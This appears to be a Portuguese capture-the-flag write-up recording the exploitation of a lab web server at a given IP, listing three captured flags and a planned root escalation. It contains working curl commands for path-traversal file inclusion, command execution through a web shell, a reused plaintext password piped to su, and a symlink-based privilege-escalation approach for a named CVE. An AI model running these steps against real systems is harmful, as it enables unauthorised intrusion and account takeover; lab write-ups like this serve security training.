# Parte 1 — 98.92.182.73 — Resultados da exploração

## Serviços
- **80/tcp** — Apache 2.4.58 (Blogo | Notícias)
- **3306/tcp** — MySQL 8.0.44
- **22, 443, 8080** — fechados

---

## Flags encontradas (3 de 4)

### Flag 1 — Comentário HTML
- **Onde:** código-fonte de `noticias.php`
- **Como:** `curl http://98.92.182.73/noticias.php` e procurar no HTML, ou LFI.
```
Solyd{9NewsNews!!!NothingWrongHereVerySecure!!!9}
```

### Flag 2 — Raiz do sistema
- **Onde:** `/flag.txt`
- **Como:** LFI `noticias.php?text=../../../../../../../../flag.txt` ou shell: `cat /flag.txt`
```
Solyd{#!UhOh#!Y0uAr3In#!#941}
```

### Flag 3 — Usuário adalberto
- **Onde:** `/home/adalberto/flag.txt`
- **Como:** RCE em `shell.php` + `su` com a senha do config:
  - `echo WPcmqw16ZmzO!5paSC4 | su - adalberto -c "cat /home/adalberto/flag.txt"`
```
Solyd{Its*Always*Easier*To*Have*One*Strong*Password}
```

---

## Flag 4 — Não obtida
- **Provável local:** `/root/flag.txt`
- **Situação:** Apenas root pode ler. O usuário **adalberto** tem `sudo` só para `/usr/local/bin/below` (sem `--config`/`--debug`), e não pode ler `/root/flag.txt`.
- **Caminho possível:** CVE-2025-27591 (below): `/var/log/below` é 777 e existe `error_root.log`. O exploit usa symlink em `error_root.log` para escalar para root; no teste remoto o `below record` ficou pendente e não foi concluído. Com shell interativa (reverse shell) dá para tentar o exploit do CVE com calma.

---

## Vetores usados
1. **LFI** em `noticias.php` — parâmetro `text`: `include("files/" . $_GET['text'])`; path traversal com `../../../../../../../../`.
2. **RCE** em `shell.php?cmd=` — execução de comandos como `www-data`.
3. **Credenciais** em `config/config.php` e `files/settings.json`: usuário **blogodb**, senha **WPcmqw16ZmzO!5paSC4** (igual à do usuário **adalberto**).
4. **Escalação para adalberto:** `echo SENHA | su - adalberto -c "comando"`.

---

## Comandos úteis (98.92.182.73)
```bash
# Flag 1
curl -s "http://98.92.182.73/noticias.php" | grep -o 'Solyd{[^}]*}'

# Flag 2 (LFI ou shell)
curl -s "http://98.92.182.73/noticias.php?text=../../../../../../../../flag.txt" | grep -o 'Solyd{[^}]*}'
# ou
curl -s "http://98.92.182.73/shell.php?cmd=cat%20/flag.txt"

# Flag 3 (shell + su)
curl -s "http://98.92.182.73/shell.php?cmd=echo%20WPcmqw16ZmzO%215paSC4%20%7C%20su%20-%20adalberto%20-c%20%22cat%20/home/adalberto/flag.txt%22%202%3E%261"
```

---
*Exploração em 07/03/2026 — IP 98.92.182.73 (Parte 1).*
